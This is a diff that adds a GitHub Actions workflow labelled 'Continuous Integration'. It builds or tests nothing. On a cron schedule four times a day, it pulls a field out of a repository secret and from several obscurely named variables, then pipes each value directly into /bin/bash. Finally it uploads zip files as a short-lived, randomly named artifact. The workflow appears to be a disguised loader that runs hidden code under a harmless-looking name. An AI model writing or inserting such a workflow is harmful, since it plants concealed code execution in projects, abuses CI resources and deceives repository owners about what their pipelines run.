@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          pt60: ${{ secrets.pt60 }}
+        run: |
+          printf '%s' "$pt60" | jq -r .qkts57 | /bin/bash
+          echo $lnk683 | jq -r .xplk262 | /bin/bash
+          printf '%s' "$sh0371" | jq -r .hw66 | /bin/bash
+          echo $n39 | jq -r .kdhdx7 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: dzgdFJ0H
+          path: "*.zip"
+          retention-days: 1
